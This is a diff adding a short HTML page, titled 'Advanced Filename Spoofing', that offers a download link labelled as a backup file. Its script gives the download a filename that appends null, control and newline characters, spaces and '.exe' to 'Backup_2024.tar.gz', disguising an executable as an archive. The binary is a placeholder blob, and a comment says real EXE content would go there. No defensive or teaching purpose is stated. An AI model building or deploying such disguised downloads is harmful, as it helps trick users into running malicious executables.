@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Advanced Filename Spoofing</title>
+  </head>
+  <body>
+    <h2>Hyper-Deception Filename Spoof</h2>
+    <p>Click below to download the disguised executable file:</p>
+
+    <a id="deceptiveDownload">⟁ HYPER-EXECUTE: Backup File</a>
+
+    <script>
+      // Filename containing invisible and control characters
+      const controlSpoofedFilename = "Backup_2024.tar.gz\x00\x1A\x0D\x0A   .exe";
+
+      // Simulated binary (e.g., real EXE content in production)
+      const blob = new Blob(["Real binary would be here"], {
+        type: "application/octet-stream"
+      });
+
+      const link = document.getElementById("deceptiveDownload");
+      link.href = URL.createObjectURL(blob);
+      link.download = controlSpoofedFilename;
+    </script>
+  </body>
+</html>
